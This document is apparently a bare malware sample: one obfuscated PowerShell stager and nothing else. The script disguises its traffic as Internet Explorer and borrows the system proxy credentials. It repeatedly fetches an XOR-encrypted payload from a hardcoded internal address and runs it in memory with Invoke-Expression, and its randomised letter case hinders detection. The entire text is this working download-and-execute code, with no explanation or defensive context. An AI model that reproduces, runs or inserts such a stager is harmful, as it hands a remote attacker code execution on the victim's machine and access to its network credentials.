
[SySTEm.Net.ServICePOiNtMAnaGeR]::EXpeCT100CONtinUE = 0;$Wc=NEw-OBjECt SYsteM.Net.WEBClIeNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaderS.Add('User-Agent',$u);$wc.ProXy = [SyStEM.Net.WEBREQUEST]::DeFAULTWeBPROXy;$wc.PrOXy.CredENtials = [SysTeM.NeT.CREDentiaLCAChE]::DEFAUltNeTwORkCreDenTIals;$K='005f47cddf568dacb8d03e20ba682cf9';$R=99;DO{tRY{$i=0;[cHAR[]]$B=([CHAR[]]($WC.DOWNLOADSTriNg("http://192.168.1.10:80/index.asp")))|%{$_-bXOr$k[$I++%$K.LeNGtH]};IEX ($b-joIN''); $R=0;}CAtcH{slEep 5;$R--}} WHile ($R -gT 0)

